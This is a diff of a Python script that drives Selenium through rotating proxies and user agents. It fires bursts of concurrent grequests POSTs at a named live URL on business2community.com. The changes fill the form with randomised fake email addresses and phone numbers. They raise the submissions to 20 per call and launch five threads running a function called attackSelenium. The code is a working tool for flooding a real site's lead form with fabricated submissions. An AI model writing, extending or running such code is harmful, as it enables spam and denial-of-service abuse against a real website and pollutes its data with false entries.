@@ -274,7 +274,7 @@ def get_driver():
 	# options.add_argument('--disable-setuid-sandbox')
 	# options.add_argument('--disable-dev-shm-usage')
 	# options.add_argument('--no-zygote')
-	options.add_argument('--blink-settings=imagesEnabled=false')
+	# options.add_argument('--blink-settings=imagesEnabled=false')
 	
 
 	# ------ Proxy
@@ -327,7 +327,7 @@ def get_driver():
 	# driver.get('https://api.ipify.org')
 	# print('used ip is %s' % driver.page_source)
 
-	return driver, proxies, userAgent
+	return driver, userAgent, proxies
 
 def sendRequest(url, proxies, userAgent, cookies):
 	headers={			
@@ -340,12 +340,12 @@ def sendRequest(url, proxies, userAgent, cookies):
 			}
 
 	data = {
-    "country": "HU",
+    "country": "NL",
     "submission_type": "standard",
     "firstname": "asd",
     "lastname": "asd",
-    "email": "asd@asd.com",
-    "telephone": "123123"
+    "email": ''.join(random.choice(letters) for i in range(10)) + "@gmail.com",
+    "telephone": "11111" + str(random.randint(1111,9999))
 	}
 
 	cookiesDict = {}
@@ -353,10 +353,11 @@ def sendRequest(url, proxies, userAgent, cookies):
 		cookiesDict[cookie['name']] = cookie['value']
 
 	requestsArr = []
-	for x in range(1):
+	for x in range(20):
+		print(url, data, headers, proxies, cookiesDict)
 		requestsArr.append(grequests.post(url, json=data, headers=headers, proxies=proxies, cookies=cookiesDict))
 	res = grequests.map(requestsArr, exception_handler=my_handler)
-	print(res, res[0].content)
+	print(res)
 
 def attackSelenium(baseUrl):
 
@@ -458,9 +459,9 @@ def attackSelenium(baseUrl):
 			driver, userAgent, proxies = get_driver()
 
 
-attackSelenium('https://www.business2community.com/visit/immediate-connect/')
-input()
-for i in range(1):
+# attackSelenium('https://www.business2community.com/visit/immediate-connect/')
+# input()
+for i in range(5):
 	Thread(target=attackSelenium, args=['https://www.business2community.com/visit/immediate-connect/']).start()
 input()
 
